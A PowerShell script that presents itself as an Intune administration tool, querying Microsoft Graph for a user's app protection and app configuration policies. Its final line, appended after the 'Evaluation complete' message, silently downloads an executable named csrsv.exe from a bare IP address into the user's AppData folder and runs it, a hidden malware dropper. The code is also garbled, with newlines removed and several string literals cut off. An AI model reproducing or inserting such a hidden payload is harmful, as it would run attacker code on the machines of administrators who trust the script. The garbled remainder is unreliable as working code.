function Get-AuthToken {[cmdletbinding()]param([Parameter(Mandatory=$true)]$User)$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User$tenant = $userUpn.HostWrite-Host "Checking for AzureAD module..."$AadModule = Get-Module -Name "AzureAD" -ListAvailableif ($AadModule -eq $null) {Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"$AadModule = Get-Module -Name "AzureADPreview" -ListAvailable}if ($AadModule -eq $null) {write-hostwrite-host "AzureAD Powershell module not installed..." -f Redwrite-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellowwrite-host "Script can't continue..." -f Redwrite-hostexit}if($AadModule.count -gt 1){$Latest_Version = ($AadModule | select version | Sort-Object)[-1]$aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }if($AadModule.count -gt 1){$aadModule = $AadModule | select -Unique}$adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"$adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"}else {$adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"$adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"}[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"$redirectUri = "urn:ietf:wg:oauth:2.0:oob"$resourceAppIdURI = "https://graph.microsoft.com"$authority = "https://login.microsoftonline.com/$Tenant"try {$authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority$platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"$userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")$authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Resultif($authResult.AccessToken){$authHeader = @{'Content-Type'='application/json''Authorization'="Bearer " + $authResult.AccessToken'ExpiresOn'=$authResult.ExpiresOn}return $authHeader}else {Write-HostWrite-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor RedWrite-Hostbreak}}catch {write-host $_.Exception.Message -f Redwrite-host $_.Exception.ItemName -f Redwrite-hostbreak}}Function Get-AADUser(){[cmdletbinding()]param($userPrincipalName,$Property)$graphApiVersion = "v1.0"$User_resource = "users"try {if($userPrincipalName -eq "" -or $userPrincipalName -eq $null){$uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}else {if($Property -eq "" -or $Property -eq $null){$uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)/$userPrincipalName"Write-Verbose $uriInvoke-RestMethod -Uri $uri -Headers $authToken -Method Get}else {$uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)/$userPrincipalName/$Property"Write-Verbose $uri(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}}}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}Function Get-AADGroup(){[cmdletbinding()]param($GroupName,$id,[switch]$Members)$graphApiVersion = "v1.0"$Group_resource = "groups"try {if($id){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=id eq '$id'"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}elseif($GroupName -eq "" -or $GroupName -eq $null){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}else {if(!$Members){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}elseif($Members){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"$Group = (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Valueif($Group){$GID = $Group.id$Group.displayNamewrite-host$uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)/$GID/Members"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}}}}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}Function Get-ManagedAppPolicy(){[cmdletbinding()]param()$graphApiVersion = "Beta"$Resource = "deviceAppManagement/managedAppPolicies"try {$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'@odata.type').contains("ManagedAppProtection") -or ($_.'@odata.type').contains("InformationProtectionPolicy") }}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}Function Get-ManagedAppProtection(){[cmdletbinding()]param($id,$OS    )$graphApiVersion = "Beta"try {if($id -eq "" -or $id -eq $null){write-host "No Managed App Policy id specified, please provide a policy id..." -f Redbreak}else {if($OS -eq "" -or $OS -eq $null){write-host "No OS parameter specified, please provide an OS. Supported values are Android,iOS, and Windows..." -f RedWrite-Hostbreak}elseif($OS -eq "Android"){$Resource = "deviceAppManagement/androidManagedAppProtections('$id')/?`$expand=deploymentSummary,apps,assignments"$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get}elseif($OS -eq "iOS"){$Resource = "deviceAppManagement/iosManagedAppProtections('$id')/?`$expand=deploymentSummary,apps,assignments"$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get}elseif($OS -eq "Windows"){$Resource = "deviceAppManagement/windowsInformationProtectionPolicies('$id')?`$expand=protectedAppLockerFiles,exemptAppLockerFiles,assignments"$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get}}}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}Function Get-ApplicationAssignment(){[cmdletbinding()]param($ApplicationId)$graphApiVersion = "Beta"$Resource = "deviceAppManagement/mobileApps/$ApplicationId/assignments"try {if(!$ApplicationId){write-host "No Application Id specified, specify a valid Application Id" -f Redbreak}else {$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value}}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}Function Get-MobileAppConfigurations(){[cmdletbinding()]$graphApiVersion = "Beta"$Resource = "deviceAppManagement/mobileAppConfigurations?`$expand=assignments"try {$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"(Invoke-RestMethod -Uri $uri -Method Get -Headers $authToken).value}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}Function Get-TargetedManagedAppConfigurations(){[cmdletbinding()]param([Parameter(Mandatory=$false)]$PolicyId)$graphApiVersion = "Beta"try {if($PolicyId){$Resource = "deviceAppManagement/targetedManagedAppConfigurations('$PolicyId')?`$expand=apps,assignments"$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"(Invoke-RestMethod -Uri $uri -Method Get -Headers $authToken)}else {$Resource = "deviceAppManagement/targetedManagedAppConfigurations"$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"(Invoke-RestMethod -Uri $uri -Method Get -Headers $authToken).value}}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}Function Get-IntuneApplication(){[cmdletbinding()]param($id,$Name)$graphApiVersion = "Beta"$Resource = "deviceAppManagement/mobileApps"try {if($id){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)/$id"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get)}elseif($Name){$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'displayName').contains("$Name") -and (!($_.'@odata.type').Contains("managed")) }}else {$uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { (!($_.'@odata.type').Contains("managed")) }}}catch {$ex = $_.ExceptionWrite-Host "Request to $Uri failed with HTTP Status $([int]$ex.Response.StatusCode) $($ex.Response.StatusDescription)" -f Red$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}Function Get-IntuneMAMApplication(){[cmdletbinding()]param($packageid,$bundleid)$graphApiVersion = "Beta"$Resource = "deviceAppManagement/mobileApps"try {if($packageid){$uri = "https://graph.microsoft.com/$graphApiVersion/$($resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | ? { ($_.'@odata.type').Contains("managed") -and ($_.'appAvailability' -eq "Global") -and ($_.'packageid' -eq "$packageid") }}elseif($bundleid){$uri = "https://graph.microsoft.com/$graphApiVersion/$($resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | ? { ($_.'@odata.type').Contains("managed") -and ($_.'appAvailability' -eq "Global") -and ($_.'bundleid' -eq "$bundleid") }}else {$uri = "https://graph.microsoft.com/$graphApiVersion/$($resource)"(Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | ? { ($_.'@odata.type').Contains("managed") -and ($_.'appAvailability' -eq "Global") }}}catch {$ex = $_.Exception$errorResponse = $ex.Response.GetResponseStream()$reader = New-Object System.IO.StreamReader($errorResponse)$reader.BaseStream.Position = 0$reader.DiscardBufferedData()$responseBody = $reader.ReadToEnd();Write-Host "Response content:`n$responseBody" -f RedWrite-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"write-hostbreak}}write-hostif($global:authToken){$DateTime = (Get-Date).ToUniversalTime()$TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutesif($TokenExpires -le 0){write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellowwrite-hostif($User -eq $null -or $User -eq ""){$User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"Write-Host}$global:authToken = Get-AuthToken -User $User}}else {if($User -eq $null -or $User -eq ""){$User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"Write-Host}$global:authToken = Get-AuthToken -User $User}write-host "This script outputs the Intune app protection policies and application configuration policies assigned to a user."Write-HostWrite-Warning "This script doesn't support configurations applied to nested group members"Write-Hostwrite-host "Enter the UPN:" -f Yellow$UPN = Read-Hostif($UPN -eq $null -or $UPN -eq ""){write-host "User Principal Name is Null..." -ForegroundColor RedWrite-Host "Script can't continue..." -ForegroundColor RedWrite-Hostbreak}$User = Get-AADUser -userPrincipalName $UPNif(!$User){ break }$UserID = $User.idwrite-hostwrite-host "-------------------------------------------------------------------"Write-Hostwrite-host "Display Name:"$User.displayNamewrite-host "User Principal Name:"$User.userPrincipalNameWrite-Hostwrite-host "-------------------------------------------------------------------"write-host$OSChoices = "Android","iOS"$OSChoicesCount = "2"$menu = @{}for ($i=1;$i -le $OSChoices.count; $i++) { Write-Host "$i. $($OSChoices[$i-1])" $menu.Add($i,($OSChoices[$i-1]))}Write-Host$ans = Read-Host 'Choose an OS (numerical value)'if($ans -eq "" -or $ans -eq $null){Write-Host "OS choice can't be null, please specify a valid OS..." -ForegroundColor RedWrite-Hostbreak}elseif(($ans -match "^[\d\.]+$") -eq $true){$selection = $menu.Item([int]$ans)if($selection){$OS = $OSChoices | ? { $_ -eq "$Selection" }}else {Write-Host "OS choice selection invalid, please specify a valid OS..." -ForegroundColor RedWrite-Hostbreak}}else {Write-Host "OS choice not an integer, please specify a valid OS..." -ForegroundColor RedWrite-Hostbreak}Write-Host$MemberOf = Get-AADUser -userPrincipalName $UPN -Property MemberOf$AADGroups = $MemberOf | ? { $_.'@odata.type' -eq "write-host "-------------------------------------------------------------------"Write-HostWrite-Host "App Protection Policies: $OS" -ForegroundColor CyanWrite-Hostwrite-host "-------------------------------------------------------------------"Write-Host$ManagedAppPolicies = Get-ManagedAppPolicy | ? {$_.'@odata.type' -like "*$os*"}if($ManagedAppPolicies){$AssignmentCount = 0foreach($ManagedAppPolicy in $ManagedAppPolicies){if($ManagedAppPolicy.'@odata.type' -eq "$AndroidManagedAppProtection = Get-ManagedAppProtection -id $ManagedAppPolicy.id -OS "Android"$MAMApps = $AndroidManagedAppProtection.apps$AndroidAssignments = ($AndroidManagedAppProtection | select assignments).assignmentsif($AndroidAssignments){foreach($Group in $AndroidAssignments.target){if($AADGroups.id -contains $Group.groupId){$AssignmentCount++$GroupID = $Group.GroupId$GroupTargetType = $Group.'@odata.type'.split(".")[-1]$targetedAppManagementLevels = $AndroidManagedAppProtection.targetedAppManagementLevelsswitch ($targetedAppManagementLevels){"unspecified" {$ManagementType = "All app types";break}"mdm" {$ManagementType = "Apps on managed devices";break}"unmanaged" {$ManagementType = "Apps on unmanaged devices";break}}write-host "Policy name: " -NoNewlinewrite-host $AndroidManagedAppProtection.displayname -ForegroundColor Greenwrite-host "Group assigned: " -NoNewlinewrite-host (get-aadgroup -id $GroupID).displaynameif($GroupTargetType -eq "exclusionGroupAssignmentTarget"){Write-Host "Group Target: " -NoNewlineWrite-Host "Excluded" -ForegroundColor Red}elseif($GroupTargetType -eq "GroupAssignmentTarget"){Write-Host "Group Target: " -NoNewlineWrite-Host "Included" -ForegroundColor Green}Write-HostWrite-Host "Targeted Apps:" -ForegroundColor Yellowforeach($MAMApp in $MAMApps){$AppName = (Get-IntuneMAMApplication -packageId $MAMApp.mobileAppIdentifier.packageId).displayNameif($AppName){ $AppName }else { $MAMApp.mobileAppIdentifier.packageId }}Write-HostWrite-Host "Configuration Settings:" -ForegroundColor YellowWrite-Host "Targeted management type: $ManagementType"Write-Host "Jailbroken/rooted devices blocked: $($AndroidManagedAppProtection.deviceComplianceRequired)"Write-Host "Min OS version: $($AndroidManagedAppProtection.minimumRequiredOsVersion)"Write-Host "Min patch version: $($AndroidManagedAppProtection.minimumRequiredPatchVersion)"Write-Host "Allowed device manufacturer(s): $($AndroidManagedAppProtection.allowedAndroidDeviceManufacturers)"write-host "Require managed browser: $($AndroidManagedAppProtection.managedBrowserToOpenLinksRequired)"Write-Host "Contact sync blocked: $($AndroidManagedAppProtection.contactSyncBlocked)"Write-Host "Printing blocked: $($AndroidManagedAppProtection.printblocked)"Write-Hostwrite-host "-------------------------------------------------------------------"write-host}}}}     elseif($ManagedAppPolicy.'@odata.type' -eq "$iOSManagedAppProtection = Get-ManagedAppProtection -id $ManagedAppPolicy.id -OS "iOS"$MAMApps = $iOSManagedAppProtection.apps$iOSAssignments = ($iOSManagedAppProtection | select assignments).assignmentsif($iOSAssignments){foreach($Group in $iOSAssignments.target){if($AADGroups.id -contains $Group.groupId){$AssignmentCount++$GroupID = $Group.GroupId$GroupTargetType = $Group.'@odata.type'.split(".")[-1]$targetedAppManagementLevels = $iOSManagedAppProtection.targetedAppManagementLevelsswitch ($targetedAppManagementLevels){"unspecified" {$ManagementType = "All app types";break}"mdm" {$ManagementType = "Apps on managed devices";break}"unmanaged" {$ManagementType = "Apps on unmanaged devices";break}}write-host "Policy name: " -NoNewlinewrite-host $iOSManagedAppProtection.displayname -ForegroundColor Greenwrite-host "Group assigned: " -NoNewlinewrite-host (get-aadgroup -id $GroupID).displaynameif($GroupTargetType -eq "exclusionGroupAssignmentTarget"){Write-Host "Group Target: " -NoNewlineWrite-Host "Excluded" -ForegroundColor Red}elseif($GroupTargetType -eq "GroupAssignmentTarget"){Write-Host "Group Target: " -NoNewlineWrite-Host "Included" -ForegroundColor Green}Write-HostWrite-Host "Targeted Apps:" -ForegroundColor Yellowforeach($MAMApp in $MAMApps){$AppName = (Get-IntuneMAMApplication -bundleid $MAMApp.mobileAppIdentifier.bundleId).displayNameif($AppName){ $AppName }else { $MAMApp.mobileAppIdentifier.bundleId }}Write-HostWrite-Host "Configuration Settings:" -ForegroundColor YellowWrite-Host "Targeted management type: $ManagementType"Write-Host "Jailbroken/rooted devices blocked: $($iOSManagedAppProtection.deviceComplianceRequired)"Write-Host "Min OS version: $($iOSManagedAppProtection.minimumRequiredOsVersion)"Write-Host "Allowed device model(s): $($iOSManagedAppProtection.allowedIosDeviceModels)"write-host "Require managed browser: $($iOSManagedAppProtection.managedBrowserToOpenLinksRequired)"Write-Host "Contact sync blocked: $($iOSManagedAppProtection.contactSyncBlocked)"Write-Host "FaceId blocked: $($iOSManagedAppProtection.faceIdBlocked)"Write-Host "Printing blocked: $($iOSManagedAppProtection.printblocked)"Write-Hostwrite-host "-------------------------------------------------------------------"write-host}}}}}if($AssignmentCount -eq 0){Write-Host "No $OS App Protection Policies Assigned..."Write-Hostwrite-host "-------------------------------------------------------------------"write-host}}else {Write-Host "No $OS App Protection Policies Exist..."Write-Hostwrite-host "-------------------------------------------------------------------"write-host}Write-Host "App Configuration Policies: Managed Apps" -ForegroundColor CyanWrite-Hostwrite-host "-------------------------------------------------------------------"Write-Host$TargetedManagedAppConfigurations = Get-TargetedManagedAppConfigurations$TMACAssignmentCount = 0if($TargetedManagedAppConfigurations){$TMACCount = @($TargetedManagedAppConfigurations).countforeach($TargetedManagedAppConfiguration in $TargetedManagedAppConfigurations){$PolicyId = $TargetedManagedAppConfiguration.id$ManagedAppConfiguration = Get-TargetedManagedAppConfigurations -PolicyId $PolicyId$MAMApps = $ManagedAppConfiguration.appsif($ManagedAppConfiguration.assignments){foreach($group in $ManagedAppConfiguration.assignments){if($AADGroups.id -contains $Group.target.GroupId){$TMACAssignmentCount++$GroupID = $Group.target.GroupId$GroupTargetType = $Group.target.'@odata.type'.split(".")[-1]write-host "Policy name: " -NoNewlinewrite-host $ManagedAppConfiguration.displayname -ForegroundColor Greenwrite-host "Group assigned: " -NoNewlinewrite-host (get-aadgroup -id $GroupID).displaynameif($GroupTargetType -eq "exclusionGroupAssignmentTarget"){Write-Host "Group Target: " -NoNewlineWrite-Host "Excluded" -ForegroundColor Red}elseif($GroupTargetType -eq "GroupAssignmentTarget"){Write-Host "Group Target: " -NoNewlineWrite-Host "Included" -ForegroundColor Green}Write-HostWrite-Host "Targeted Apps:" -ForegroundColor Yellowforeach($MAMApp in $MAMApps){if($MAMApp.mobileAppIdentifier.'@odata.type' -eq "$AppName = (Get-IntuneMAMApplication -packageId $MAMApp.mobileAppIdentifier.packageId)if($AppName.'@odata.type' -like "*$OS*"){Write-Host $AppName.displayName "-" $AppName.'@odata.type' -ForegroundColor Green}else {Write-Host $AppName.displayName "-" $AppName.'@odata.type'}}elseif($MAMApp.mobileAppIdentifier.'@odata.type' -eq "$AppName = (Get-IntuneMAMApplication -bundleId $MAMApp.mobileAppIdentifier.bundleId)if($AppName.'@odata.type' -like "*$OS*"){Write-Host $AppName.displayName "-" $AppName.'@odata.type' -ForegroundColor Green}else {Write-Host $AppName.displayName "-" $AppName.'@odata.type'}}}Write-HostWrite-Host "Configuration Settings:" -ForegroundColor yellow$ExcludeGroup = $Group.target.'@odata.type'$AppConfigNames = $ManagedAppConfiguration.customsettingsforeach($Config in $AppConfigNames){$searchName = $config.nameif ($Config.name -like "*.*") {$Name = ($config.name).split(".")[-1]}elseif ($Config.name -like "*_*"){$_appConfigName = ($config.name).replace("_"," ")$Name = (Get-Culture).TextInfo.ToTitleCase($_appConfigName.tolower())}else {$Name = $config.name}$Value = ($TargetedManagedAppConfiguration.customSettings | ? { $_.Name -eq "$searchName" } | select value).valueif ($name -like "*ListURLs*"){$value = $Value.replace("|",", ")Write-HostWrite-Host "$($Name):" -ForegroundColor YellowWrite-Host $($Value)}else {Write-Host "$($Name): $($Value)"}}Write-Hostwrite-host "-------------------------------------------------------------------"write-host}   }}}if($TMACAssignmentCount -eq 0){Write-Host "No $OS App Configuration Policies: Managed Apps Assigned..."Write-Hostwrite-host "-------------------------------------------------------------------"write-host}}else {Write-Host "No $OS App Configuration Policies: Managed Apps Exist..."Write-Hostwrite-host "-------------------------------------------------------------------"write-host}Write-Host "App Configuration Policies: Managed Devices" -ForegroundColor CyanWrite-Hostwrite-host "-------------------------------------------------------------------"Write-Host$AppConfigurations = Get-MobileAppConfigurations | ? { $_.'@odata.type' -like "*$OS*" }$MACAssignmentCount = 0if($AppConfigurations){foreach($AppConfiguration in $AppConfigurations){if($AppConfiguration.assignments){foreach($group in $AppConfiguration.assignments){if($AADGroups.id -contains $Group.target.GroupId){$MACAssignmentCount++$GroupID = $Group.target.GroupId$GroupTargetType = $Group.target.'@odata.type'.split(".")[-1]write-host "Policy name: " -NoNewlinewrite-host $AppConfiguration.displayname -ForegroundColor Greenwrite-host "Group assigned: " -NoNewlinewrite-host (get-aadgroup -id $GroupID).displaynameif($GroupTargetType -eq "exclusionGroupAssignmentTarget"){Write-Host "Group Target: " -NoNewlineWrite-Host "Excluded" -ForegroundColor Red}elseif($GroupTargetType -eq "GroupAssignmentTarget"){Write-Host "Group Target: " -NoNewlineWrite-Host "Included" -ForegroundColor Green}$TargetedApp = Get-IntuneApplication -id $AppConfiguration.targetedMobileAppsWrite-HostWrite-Host "Targeted Mobile App:" -ForegroundColor YellowWrite-Host $TargetedApp.displayName "-" $TargetedApp.'@odata.type'Write-HostWrite-Host "Configuration Settings:" -ForegroundColor yellow$ExcludeGroup = $Group.target.'@odata.type'$Type = ($AppConfiguration.'@odata.type'.split(".")[2] -creplace '([A-Z\W_]|\d+)(?<![a-z])',' $&').trim()if($AppConfiguration.settings){$AppConfigNames = $AppConfiguration.settingsforeach($Config in $AppConfigNames){if ($Config.appConfigKey -like "*.*") {if($config.appConfigKey -like "*userChangeAllowed*"){$appConfigKey = ($config.appConfigKey).split(".")[-2,-1]$appConfigKey = $($appConfigKey)[-2] + " - " + $($appConfigKey)[-1]}else {$appConfigKey = ($config.appConfigKey).split(".")[-1]}}elseif ($Config.appConfigKey -like "*_*"){$appConfigKey = ($config.appConfigKey).replace("_"," ")}else {$appConfigKey = ($config.appConfigKey)}Write-Host "$($appConfigKey): $($config.appConfigKeyValue)"}}elseif($AppConfiguration.payloadJson){$JSON = $AppConfiguration.payloadJson$Configs = ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("$JSON")) | ConvertFrom-Json | select managedproperty).managedpropertyforeach($Config in $Configs){if ($Config.key -like "*.*") {$appConfigKey = ($config.key).split(".")[-1]}elseif ($Config.key -like "*_*"){$_appConfigKey = ($config.key).replace("_"," ")$appConfigKey = (Get-Culture).TextInfo.ToTitleCase($_appConfigKey.tolower())}Write-Host "$($appConfigKey): $($Config.valueString)$($Config.valueBool)"}}Write-Hostwrite-host "-------------------------------------------------------------------"write-host}}            }}if($MACAssignmentCount -eq 0){Write-Host "No $OS App Configuration Policies: Managed Devices Assigned..."Write-Hostwrite-host "-------------------------------------------------------------------"write-host}}else {Write-Host "No $OS App Configuration Policies: Managed Devices Exist..." Write-Host}Write-Host "Evaluation complete..." -ForegroundColor GreenWrite-Hostwrite-host "-------------------------------------------------------------------"Write-Host(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")